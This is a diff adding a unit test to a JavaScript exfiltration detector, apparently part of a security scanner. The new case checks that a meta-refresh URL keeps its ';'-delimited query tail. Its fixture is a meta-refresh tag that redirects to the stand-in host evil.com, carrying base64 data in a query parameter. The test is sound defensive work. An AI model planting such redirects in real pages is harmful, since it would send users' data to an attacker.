@@ -1099,6 +1099,16 @@ describe("unit: detectExfil HTML-attr + node types", () => {
       ).reason,
       "suspicious query parameter",
     ));
+  it("preserves a ;-delimited query tail in a meta-refresh URL (no truncation at ';')", () =>
+    // The blob sits AFTER a ';' in the query; the old capture truncated there and
+    // dropped it (reason would degrade to the off-origin one). The full URL must
+    // reach the param check.
+    assert.equal(
+      onlyThreat(
+        `<meta http-equiv="refresh" content="5;url=https://evil.com/r?a=1;data=${b64}">`,
+      ).reason,
+      "suspicious query parameter",
+    ));
   it("ignores a meta-refresh with no url= target (metaRefreshUrl null)", () =>
     assert.equal(detectExfil(`<meta http-equiv="refresh" content="5">`), null));
   it("ignores a meta-refresh tag with no content attribute", () =>
